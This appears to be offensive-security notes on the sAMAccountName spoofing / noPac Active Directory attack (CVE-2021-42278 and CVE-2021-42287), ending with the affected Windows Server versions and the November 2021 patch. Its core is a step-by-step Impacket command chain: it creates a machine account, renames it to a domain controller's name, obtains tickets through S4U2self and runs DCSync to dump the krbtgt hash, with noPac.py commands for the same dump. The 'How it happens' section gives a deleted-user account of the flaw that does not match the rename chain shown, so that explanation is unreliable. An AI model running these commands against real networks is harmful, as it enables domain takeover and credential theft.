# sAMAccountName Spoofing
Involves renaming a machine account's sAMAccountName combined with S4U2self. Computer accounts should have a trailing $ in their name (i.e. sAMAccountName attribute) but no validation process existed to make sure of it. Abused in combination with CVE-2021-42287, it allowed attackers to impersonate domain controller accounts.

Common root causes:

- The long-standing convention that machine accounts end with $ in their sAMAccountName.
- KDC behavior that can append or resolve $ when a requested principal name does not exactly match an existing account.
- Abuse of MachineAccountQuota to create machine accounts.
- The Trailing $ Behavior: If the KDC cannot find bob, it has a built-in fallback behavior. It automatically appends a $ to the end and searches again for bob$.

## How it happens 
- A malicious or compromised user account named bob initially logs in normally. Because he has valid credentials, the KDC issues him a Ticket Granting Ticket (TGT).
- Right after bob gets his TGT, an administrator deletes the bob user account from Active Directory.
- Crucially, bob still holds his valid TGT in memory. Kerberos TGTs are self-contained and typically valid for 10 hours; the KDC doesn't check if the user still exists just to read a TGT that has already been signed by the KDC.
- The attacker uses bob's TGT to make an S4U2self (Service for User to Self) request.
### Flow
1. The KDC receives the request from bob's TGT.
2. The KDC looks at the identity of the service requesting the ticket, which is bob.
3. The KDC searches Active Directory for the account bob.
4. But bob was deleted! The KDC finds nothing.
5. Instead of failing, the KDC's trailing $ fallback kicks in. It automatically searches Active Directory for bob$.
The Result: The attacker started with a deleted user account (bob) and ended up with a high-privilege Service Ticket for a Domain Controller or critical server (bob$), completely bypassing security boundaries.

## Requirements
The ability to edit a machine account's sAMAccountName and servicePrincipalName attributes is a requirement to the attack chain.

The attack can then be conducted as follows.

1. Clear the controlled machine account servicePrincipalName attribute of any value that points to its name (e.g. host/machine.domain.local, RestrictedKrbHost/machine.domain.local)
2. Change the controlled machine account sAMAccountName to a Domain Controller's name without the trailing $ -> CVE-2021-42278
3. Request a TGT for the controlled machine account
4. Reset the controlled machine account sAMAccountName to its old value (or anything else different than the Domain Controller's name without the trailing $)
5. Request a service ticket with S4U2self by presenting the TGT obtained before -> CVE-2021-42287

```bash
# 0. create a computer account
addcomputer.py -computer-name "$COMPUTER_ACCOUNT" -computer-pass "$COMPUTER_PASSWORD" -dc-host "$DC_HOST$" -domain-netbios "$DOMAIN_NETBIOS" "$DOMAIN/$USER:$PASSWORD"

# 1. clear its SPNs
addspn.py --clear -t "$COMPUTER_ACCOUNT" -u "$DOMAIN\\$USER" -p "$PASSWORD" "$DC_HOST"

# 2. rename the computer (computer -> DC)
renameMachine.py -current-name "$COMPUTER_ACCOUNT" -new-name "$DOMAIN_CONTROLLER" -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"

# 3. obtain a TGT
getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/"$DOMAIN_CONTROLLER":"$PASSWORD"

# 4. reset the computer name
renameMachine.py -current-name "$DOMAIN_CONTROLLER" -new-name "$COMPUTER_ACCOUNT" "$DOMAIN/$USER:$PASSWORD"

# 5. obtain a service ticket with S4U2self by presenting the previous TGT
KRB5CCNAME="DomainController.ccache" getST.py -self -impersonate "$TARGET_USER" -altservice "cifs/$DC_HOST" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"DomainController"

# 6. DCSync by presenting the service ticket
KRB5CCNAME="DomainAdmin.ccache" secretsdump.py -just-dc-user "krbtgt" -k -no-pass -dc-ip "$DC_HOST" @"$DC_HOST"
```

noPac.py (Python) is an automated alternative that can be used to scan and abuse unpatched targets from a UNIX-like environnment.

```bash
scanner.py "$DOMAIN"/"$USERNAME":"$PASSWORD" -dc-ip "$DC_IP"
noPac.py "$DOMAIN"/"$USERNAME":"$PASSWORD" -dc-ip "$DC_IP" --impersonate Administrator -dump
```

**When using Impacket's addcomputer script for the creation of a computer account, the "SAMR" method is used by default (instead of the LDAPS one). The SAMR method creates the account without SPNs, which allows to skip step #1.**


# This attack can be done with user accounts as follow:
### Requirements
1. Ability to edit the account SAMaccountName.
2. Knowledge of user account's password, or hash.
3. SPN's must be stripped from the user account too.
Appart from the computer account creation and SPNs manipulation, the exploitation steps are the same as with a machine account


Affected Windows Server Versions

- Windows Server 2022
- Windows Server 2019
- Windows Server 2016 (all editions)
- Windows Server 2012 R2
- Windows Server 2012
- Windows Server 2008 R2
- Windows Server 2008 Service Pack 2 (including Server Core installation)
- Windows Server version 2004
**The vulnerability is addressed by the November 9, 2021 Microsoft security updates (such as KB5008102 and related security rollup patches released on or after November 9, 2021). Systems running these OS versions before installing the November 9, 2021 updates (or subsequent cumulative/superseding updates like December 2021 patches) are vulnerable to the sAMAccountName spoofing bypass**
